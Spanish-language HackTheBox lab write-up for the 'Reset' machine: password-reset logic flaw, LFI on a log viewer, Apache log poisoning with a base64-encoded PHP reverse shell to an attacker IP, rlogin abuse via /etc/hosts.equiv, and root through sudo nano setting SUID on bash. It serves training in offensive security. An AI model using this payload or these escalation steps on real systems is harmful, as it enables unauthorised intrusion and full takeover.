+++ 
draft = false
date = 2026-05-16T07:56:08Z
title = "Reset Machine - HackTheBox"
description = ""
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Linux #LFI #nano #rlogin #LogPoisoning
----------------

# Introducción

En este _writeup_ detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de _Log Poisoning_ sobre los registros de Apache.

El vector de escalada interna resulta especialmente interesante, combinando configuraciones _legacy_ y binarios de uso diario. El movimiento lateral hacia el usuario `sadm` lo conseguiremos abusando de una relación de confianza insegura en los servicios R (_R-Services_) gracias a una mala configuración en el archivo `/etc/hosts.equiv`. Finalmente, la escalada a privilegios máximos (`root`) se logrará inspeccionando sesiones activas de `tmux` y explotando un permiso `sudo` mal configurado sobre el editor de texto `nano`, ejecutando comandos del sistema desde sus opciones internas para asignarle permisos SUID al binario `bash`.
# Enumeración Nmap

Realizamos un escaneo de los puertos, encontrando como resultado el puerto `80` abierto, que está corriendo el servicio `HTTP`, y el puerto `22` corriendo `SSH`

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.233 -oG allPorts
```

Encontrando los siguientes puertos abiertos

<img src="/images/Pasted image 20260516022318.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora, si realizamos un escaneo por las versiones de estos puertos, con el siguiente comando

```bash
nmap -p22,80,512,513,514 -sCV 10.129.33.161 -oN portServices
```

Obtenemos el resultado de a continuación

<img src="/images/Pasted image 20260516022531.png" style="width:100%; height:auto; display:block; margin:auto;">

Como información relevante, tenemos lo siguiente

- 512/tcp (rexec): Permite la ejecución remota de comandos.
- 513/tcp (rlogin): Permite el inicio de sesión remoto.
- 514/tcp (rsh): Shell remota.

# Enumeración HTTP

Comenzamos enumerando el puerto `HTTP`. Al entrar en la aplicación web, encontramos una página de login.

<img src="/images/Pasted image 20260516023139.png" style="width:100%; height:auto; display:block; margin:auto;">

Como no tenemos credenciales válidas, y como tampoco funcionan las credenciales típicas, nos centraremos en la función `Forgot Password?`

Vemos que esta función nos solicita un nombre de usuario. Si escribimos uno que no existe, nos aparece el siguiente mensaje

<img src="/images/Pasted image 20260516023427.png" style="width:100%; height:auto; display:block; margin:auto;">

Pero al colocar un usuario válido, nos muestra que se ha reiniciado su contraseña

<img src="/images/Pasted image 20260516023457.png" style="width:100%; height:auto; display:block; margin:auto;">

Por lo cual tenemos una vía para enumerar usuarios. Para entender mejor el funcionamiento del reinicio de contraseña, interceptaremos la petición con `Burpsuite`

Tenemos que la petición que mandamos es la siguiente

<img src="/images/Pasted image 20260516023812.png" style="width:100%; height:auto; display:block; margin:auto;">

Al enviarla encontramos que se genera una contraseña nueva

<img src="/images/Pasted image 20260516023829.png" style="width:100%; height:auto; display:block; margin:auto;">

Utilizamos la contraseña obtenida para loguearnos en la página web

<img src="/images/Pasted image 20260516023917.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que son válidas, entrando al `dashboard` como el usuario `admin`

<img src="/images/Pasted image 20260516024425.png" style="width:100%; height:auto; display:block; margin:auto;">

En teoría la aplicación web debería permitirnos leer el archivo de `syslog`, pero no nos muestra nada

<img src="/images/Pasted image 20260516024722.png" style="width:100%; height:auto; display:block; margin:auto;">

Si interceptamos la petición, tenemos lo siguiente

<img src="/images/Pasted image 20260516024749.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que está accediendo al recurso `/var/log/syslog`, pero la web no nos muestra el resultado, por lo cual probaremos ver otros archivos

# Explotando LFI

Como la página nos permite ver archivos de `logs`, un archivo interesante a la hora de realizar un `LFI` es `/var/log/apache2/access.log`

Por lo tanto mandaremos la siguiente petición

<img src="/images/Pasted image 20260516025207.png" style="width:100%; height:auto; display:block; margin:auto;">

Obteniendo como respuesta el contenido del archivo, confirmando la vulnerabilidad `LFI`

<img src="/images/Pasted image 20260516025228.png" style="width:100%; height:auto; display:block; margin:auto;">

# Log Poisoning

Como tenemos capacidad de lectura del archivo de `logs` de apache, y además, lo podemos leer mediante un archivo `.php`, podemos intentar insertar código en `PHP` para conseguir una `reverse shell`

Para ello, primeramente utilizaremos `Penelope`, para obtener nuestro payload de `reverse shell`

<img src="/images/Pasted image 20260516025732.png" style="width:100%; height:auto; display:block; margin:auto;">

Posteriormente creamos un archivo que contenga el `User-Agent` malicioso

```bash
echo -n "User-Agent: <?php system('printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuNTUvNDQ0NCAwPiYxKSAm|base64 -d|bash'); ?>" > Poison
```

y con el siguiente comando, enviamos la petición

```bash
curl -s "http://10.129.33.161/dashboard.php" -H @Poison
```

<img src="/images/Pasted image 20260516025926.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora si desde `Burpsuite` volvemos a mandar la petición anterior `file=%2Fvar%2Flog%2Fapache2%2Faccess.log`, obtenemos nuestra shell

<img src="/images/Pasted image 20260516030115.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral

Si vamos a `/home/sadm` encontramos la `user.txt`; además, vemos un archivo `.rhosts`

<img src="/images/Pasted image 20260516030517.png" style="width:100%; height:auto; display:block; margin:auto;">

Enumerando el sistema nos encontramos con los siguientes archivos interesantes

<img src="/images/Pasted image 20260516030559.png" style="width:100%; height:auto; display:block; margin:auto;">

Encontramos el archivo `/etc/hosts.equiv` el cual es un archivo de confianza usado por servicios como `rsh`, `rlogin` y `rexec` que define qué hosts remotos pueden autenticarse sin pedir contraseña para ciertos usuarios, como aparece aquí

<img src="/images/Pasted image 20260516031623.png" style="width:100%; height:auto; display:block; margin:auto;">

Para mayor información tenemos lo siguiente: https://docs.oracle.com/cd/E19455-01/805-7229/remotehowtoaccess-36082/index.html

El archivo indica una relación de confianza para el usuario `sadm`, lo que potencialmente permitiría autenticación remota sin contraseña mediante servicios `r*` (`rsh`, `rlogin`, etc.).

<img src="/images/Pasted image 20260516031843.png" style="width:100%; height:auto; display:block; margin:auto;">

Como vimos en el escaneo inicial, estos servicios se encuentran disponibles en la máquina víctima, por lo cual procederemos a crear el usuario `sadm`, en nuestro host atacante, y nos conectaremos por `rsh`

```bash
useradd sadm
passwd sadm
```

<img src="/images/Pasted image 20260516032138.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora debemos cambiarnos al usuario `sadm` con el siguiente comando

```bash
su sadm
```

Y desde el usuario `sadm` realizaremos el siguiente comando

```bash
rlogin 10.129.33.161 -l sadm
```

Consiguiendo una consola interactiva

<img src="/images/Pasted image 20260516032626.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Buscando por los procesos que se ejecutan en el sistema víctima, tenemos una sesión activa de `tmux`

<img src="/images/Pasted image 20260516033039.png" style="width:100%; height:auto; display:block; margin:auto;">

Si ejecutamos el comando `tmux ls`, tenemos lo siguiente

<img src="/images/Pasted image 20260516033105.png" style="width:100%; height:auto; display:block; margin:auto;">

Como vemos que la sesión existe , intentamos conectarnos a ella

```bash
tmux attach -t sadm_session
```

y tenemos lo siguiente

<img src="/images/Pasted image 20260516033210.png" style="width:100%; height:auto; display:block; margin:auto;">

Si revisamos los permisos de sudoers, obtenemos lo siguiente

<img src="/images/Pasted image 20260516033426.png" style="width:100%; height:auto; display:block; margin:auto;">

Lo más importante es que podemos utilizar `nano` con privilegios `sudo` para modificar el archivo `/etc/firewall.sh`

Podemos abusar de este privilegio para ejecutar comandos como `root` de la siguiente forma

```bash
sudo /usr/bin/nano /etc/firewall.sh
```

<img src="/images/Pasted image 20260516033703.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora, si presionamos `CTRL + T`, podemos ejecutar comandos

<img src="/images/Pasted image 20260516033725.png" style="width:100%; height:auto; display:block; margin:auto;">

Ejecutaremos el comando `chmod u+s /bin/bash`

<img src="/images/Pasted image 20260516033837.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora si ejecutamos el siguiente comando, obtendremos privilegios `root`

```bash
bash -p
```

<img src="/images/Pasted image 20260516033922.png" style="width:100%; height:auto; display:block; margin:auto;">

Por lo cual podemos leer la `root.txt`, y logramos obtener control total sobre la máquina víctima

<img src="/images/Pasted image 20260516033957.png" style="width:100%; height:auto; display:block; margin:auto;">

